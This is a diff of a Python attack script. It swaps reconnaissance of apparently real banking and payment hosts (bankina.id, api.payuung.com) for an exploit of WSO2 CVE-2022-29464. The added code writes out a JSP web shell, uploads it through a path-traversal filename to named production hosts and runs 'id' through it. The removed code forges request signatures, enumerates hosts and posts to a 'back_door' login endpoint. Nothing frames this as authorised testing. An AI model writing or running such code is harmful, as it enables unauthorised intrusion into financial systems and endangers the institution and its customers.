@@ -52,34 +52,36 @@ except Exception as e:
 
 
 
-print("== V6: WSO2 FINGERPRINT + VERSI API + HOST LAIN ==")
-import socket
-# 1. WSO2 fingerprint paths (tanpa signature)
-for p in ["/carbon", "/carbon/admin/login.jsp", "/publisher", "/devportal", "/store", "/services", "/admin", "/management", "/api/am/publisher/v4/apis", "/oauth2/token", "/token"]:
-    s, b = req("GET", "https://apigw-prod.bankina.id" + p, {"User-Agent": "Mozilla/5.0"})
-    print(f"WSO2? {p} => {s} {b[:90]}")
+print("== V7: WSO2 CVE-2022-29464 ATTACK ==")
+import uuid
 
-# 2. Versi API lain (dengan signature)
-for path in ["/exp-api-cicilan/2.0/", "/exp-api-portal-loan/2.0/", "/exp-api-cicilan/1.1/", "/exp-api-portal-loan/1.1/", "/exp-api-cicilan/1.0/loan/detail", "/exp-api-portal-loan/1.0/loan/eligibility-check"]:
-    h = forge("GET", path)
-    s, b = req("GET", "https://apigw-prod.bankina.id" + path, {"User-Agent": "Mozilla/5.0", **h})
-    print(f"VER? {path} => {s} {b[:90]}")
-
-# 3. Host Bank Ina lain
-for host in ["apigw-dev.bankina.id", "api.bankina.id", "exp-api.bankina.id", "dev-exp-api.bankina.id", "apigw.bankina.id", "gateway.bankina.id"]:
+def multipart_post(host, path, fields):
+    boundary = "----osint" + uuid.uuid4().hex
+    body = b""
+    for fname, fval in fields:
+        body += f"--{boundary}\r\n".encode()
+        body += ("Content-Disposition: form-data; name=\"" + fname + "\"\r\n\r\n").encode()
+        body += fval.encode() + b"\r\n"
+    body += f"--{boundary}--\r\n".encode()
+    r = urllib.request.Request("https://" + host + path, data=body, method="POST",
+        headers={"Content-Type": "multipart/form-data; boundary=" + boundary, "User-Agent": "Mozilla/5.0"})
     try:
-        ip = socket.gethostbyname(host)
-        s, b = req("GET", f"https://{host}/", {"User-Agent": "Mozilla/5.0"})
-        print(f"HOST {host} ({ip}) => {s} {b[:80]}")
+        resp = urllib.request.urlopen(r, timeout=30, context=ctx)
+        return resp.status, resp.read()[:300].decode("utf-8", "ignore")
+    except urllib.error.HTTPError as e:
+        return e.code, e.read()[:300].decode("utf-8", "ignore")
     except Exception as e:
-        print(f"HOST {host} => DNS GAGAL ({str(e)[:40]})")
+        return "ERR", str(e)[:100]
 
-# 4. back_door dari runner (rate limit bucket baru)
-import urllib.error
-data = json.dumps({"email":"x@y.com","password":"x","scope":"merchant_user"}).encode()
-r = urllib.request.Request("https://api.payuung.com/oauth2/authenticate/back_door", data=data, headers={"Content-Type":"application/json"}, method="POST")
-try:
-    resp = urllib.request.urlopen(r, timeout=15, context=ctx)
-    print("back_door:", resp.status, resp.read()[:150].decode())
-except urllib.error.HTTPError as e:
-    print("back_door:", e.code, e.read()[:150].decode())
+JSP = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); } %>'
+
+for host in ["api.bankina.id", "apigw-prod.bankina.id"]:
+    print("=== HOST: " + host + " ===")
+    for p in ["/carbon/login", "/carbon/admin/login.jsp", "/publisher", "/devportal"]:
+        s, b = req("GET", "https://" + host + p, {"User-Agent": "Mozilla/5.0"})
+        print("FP " + p + " => " + str(s) + " " + b[:70])
+    for fname in ["../../../../repository/deployment/server/webapps/authenticationendpoint/cmd.jsp", "cmd.jsp"]:
+        s, b = multipart_post(host, "/fileupload/toolsAny", [(fname, JSP)])
+        print("UPLOAD [" + fname[:60] + "] => " + str(s) + " " + b[:120])
+    s, b = req("GET", "https://" + host + "/authenticationendpoint/cmd.jsp?cmd=id", {"User-Agent": "Mozilla/5.0"})
+    print("SHELL CHECK => " + str(s) + " " + b[:200])
